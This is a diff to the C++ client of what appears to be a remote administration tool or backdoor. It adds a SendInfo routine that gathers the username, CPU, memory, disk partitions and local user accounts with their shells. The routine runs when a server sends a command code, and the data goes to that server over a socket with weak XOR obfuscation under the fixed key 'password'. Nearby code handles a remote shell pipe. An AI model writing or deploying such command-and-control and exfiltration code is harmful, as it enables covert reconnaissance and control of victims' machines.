@@ -1,6 +1,62 @@
 #include "Client.hpp"
 #include "Commands.hpp"
 #include "Misc.hpp"
+#include "Info.hpp"
+
+bool Client::SendInfo(){
+	#ifdef _DEBUG
+	std::cout<<"Sending info\n";
+	#endif
+	bool bFlag = true;
+	std::string strFinal = "";
+	std::vector<struct sPartition> vcVec;
+	std::vector<struct sUsers> vcVec2;
+	char *cMem = nullptr, *cCpu = nullptr, *cCores = nullptr, *cUsername = nullptr;
+	Uname(cMem);
+	Cpu(cCpu, cCores);
+	if(UserName(cUsername) == 0){
+		strFinal.append(cUsername);
+	} else {
+		strFinal.append("siseneg");
+	}	
+	strFinal.append(1, '|');
+	Partitions(vcVec);
+	Users(vcVec2);
+	for(int iIt = 0; iIt<int(vcVec.size()); iIt++){
+		strFinal.append(vcVec[iIt].cPartition);
+		strFinal.append(1, ':');
+		strFinal.append(std::to_string(vcVec[iIt].dParitionSize));
+		strFinal.append(1, '*');
+	}
+		strFinal.append(1, '|');
+	for(int iIt2 = 0; iIt2<int(vcVec2.size()); iIt2++){
+		//std::cout<<vcVec2[iIt2].cUsername<<'\t'<<vcVec2[iIt2].cShell<<'\n';
+		strFinal.append(vcVec2[iIt2].cUsername);
+		strFinal.append(1, ':');
+		strFinal.append(vcVec2[iIt2].cShell);
+		strFinal.append(1, '*');
+	}
+	strFinal.append("|AAA");
+	#ifdef _DEBUG
+	std::cout<<"packet\n"<<strFinal<<'\n';
+	#endif
+	if(ssSendBinary(strFinal.c_str()) <= 0){
+		#ifdef _DEBUG
+		std::cout<<"Unable to send data to server\n";
+		error();
+		#endif
+		bFlag = false;
+	}
+	delete[] cUsername;
+	cUsername = nullptr;
+	delete[] cMem;
+	cMem = nullptr;
+	delete[] cCpu;
+	cCpu = nullptr;
+	delete[] cCores;
+	cCores = nullptr;
+	return bFlag;
+}
 
 void Client::threadReadShell(int& Pipe){
 	fcntl(Pipe, F_SETFL, O_NONBLOCK); //make fd non-block so stop when program exits
@@ -331,7 +387,17 @@ bool Client::ParseCommand(char*& strCommand){
 			}
 			goto release;
 		}
-		
+		if(vcCommands[0] == CommandCodes::cReqInfo){
+			if(vcCommands[1] == "0"){
+				if(!SendInfo()){
+					#ifdef _DEBUG
+					std::cout<<"Unable to send information to server\n";
+					error();
+					#endif
+				}
+			}
+			goto release;
+		}
 	} else {
 		#ifdef _DEBUG
 		std::cout<<"Error parsing raw data\n----------\n"<<strCommand<<"\n---------n";
@@ -407,14 +473,15 @@ int Client::ssRecvStr(std::string& strOutput, int sBytes){
 }
 
 int Client::ssSendBinary(const char *cData){
-	char *tmpData = nullptr;
-	int sBytes = BinaryCipher(cData, tmpData);
-	int iBytes = send(sckSocket, tmpData, sBytes, 0);
+	//char *tmpData = nullptr;
+	//int sBytes = BinaryCipher(cData, tmpData);
+	std::string strFinal = ShellXor(std::string(cData), std::string("password"));
+	int iBytes = send(sckSocket, strFinal.c_str(), strFinal.length(), 0);
 	#ifdef _DEBUG_CONNECTION
 	std::cout<<"> "<<cData<<'\n';
 	#endif
-	delete[] tmpData;
-	tmpData = nullptr;
+	//delete[] tmpData;
+	//tmpData = nullptr;
 	return iBytes;
 }
 	
